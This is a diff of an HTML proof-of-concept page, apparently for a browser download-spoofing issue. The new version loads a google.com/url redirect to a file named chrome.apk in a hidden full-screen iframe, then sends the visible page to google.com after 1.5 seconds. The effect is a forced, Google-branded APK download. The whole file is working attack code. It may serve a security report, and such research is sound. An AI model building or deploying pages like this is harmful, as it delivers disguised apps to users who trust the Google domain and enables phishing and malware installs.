@@ -3,69 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Dual Link Redirect</title>
+    <title>Auto Redirect PoC</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background-color: #f4f4f9;
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
-        h1 {
-            color: #333;
-        }
-        .container {
-            margin-top: 30px;
-        }
-        a.button-link {
-            display: block;
-            width: 80%;
-            max-width: 400px;
-            margin: 15px auto;
-            padding: 14px 20px;
-            font-size: 15px;
-            font-weight: bold;
-            cursor: pointer;
-            background-color: #1a73e8;
-            color: white;
+        iframe {
+            width: 100%;
+            height: 100%;
             border: none;
-            border-radius: 6px;
-            text-decoration: none;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            transition: background 0.2s;
-            word-break: break-all;
-        }
-        a.button-link:hover {
-            background-color: #1557b0;
         }
     </style>
 </head>
 <body>
 
-    <h1>PoC Test Page</h1>
-    <p>Silakan long-press salah satu tautan di bawah dan pilih "Open in new window":</p>
+    <!-- Iframe memuat URL yang Anda inginkan -->
+    <iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" id="targetIframe"></iframe>
 
-    <div class="container">
-        <!-- Tautan 1: Google.com Murni -->
-        <div>
-            <a href="https://www.google.com" 
-               class="button-link" 
-               target="_blank" 
-               rel="noopener noreferrer">
-                Open Google.com
-            </a>
-        </div>
-
-        <!-- Tautan 2: Google Redirect Lengkap ke APK -->
-        <div>
-            <a href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" 
-               class="button-link" 
-               target="_blank" 
-               rel="noopener noreferrer">
-                Open Google Redirect (APK)
-            </a>
-        </div>
-    </div>
+    <script>
+        // Skrip untuk melakukan redirect halaman utama secara otomatis setelah beberapa milidetik / saat iframe dimuat
+        setTimeout(function() {
+            window.location.href = "https://www.google.com";
+        }, 1500); // Penundaan 1.5 detik (bisa diubah sesuai kebutuhan)
+    </script>
 
 </body>
 </html>
